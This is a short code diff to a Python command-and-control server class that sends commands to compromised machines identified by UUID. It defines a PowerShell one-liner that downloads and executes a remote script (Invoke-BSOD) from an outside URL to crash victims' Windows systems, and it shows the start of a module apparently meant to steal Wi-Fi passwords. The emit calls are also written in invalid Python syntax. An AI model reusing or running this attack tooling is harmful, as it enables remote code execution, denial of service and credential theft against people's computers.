@@ -117,8 +117,9 @@ class C2:
         uuids = data['uuids']
 
         if explotation_module_type == "bsod":
+            command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
             for uuid in uuids:
-                self.sio.emit('uuid': uuid, 'cmd': "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD")
+                self.sio.emit('uuid': uuid, 'cmd': command)
 
         if explotation_module_type == "wifi-password":
             for uuid in uuids:
